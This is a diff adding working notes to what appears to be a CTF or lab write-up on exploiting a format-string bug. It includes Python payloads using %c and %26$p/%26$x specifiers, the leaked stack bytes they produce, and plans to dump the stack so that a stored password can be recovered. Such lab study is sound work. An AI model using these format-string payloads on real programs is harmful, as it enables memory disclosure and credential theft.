@@ -122,3 +122,22 @@ HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
 password = "I" * (96) + '%c'
 IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII\x40
 ```
+
+Reach the password on the stack:
+Note that %c only prints one of 4 characters
+
+```
+password = (pay := bytes([0xAA]) * 2) + b"%c" * (98 // 2  - len(pay))
+\xaa\xaa`\xaa\xff`\x00\x1e\xa0twast\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xaa%%%%%%%%%%%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+
+password = (pay := bytes([0xAA, 0xBB, 0xCC, 0xDD])) + b"_%26$p_%26$x"
+\xaa\xbb\xcc\xdd_0xddccbbaa_ddccbbaa
+```
+
+How do we find the location of the true password to put it on the stack?
+
+'For the exploit in Figure3 to succeed, we need to know the address of the buffer,
+because it is the memory address with which we overwrite the return address.'
+
+What we can do is try to print the stack with minimum smashing to get the contents of the stack. (Assuming it stays the
+same between iterations)
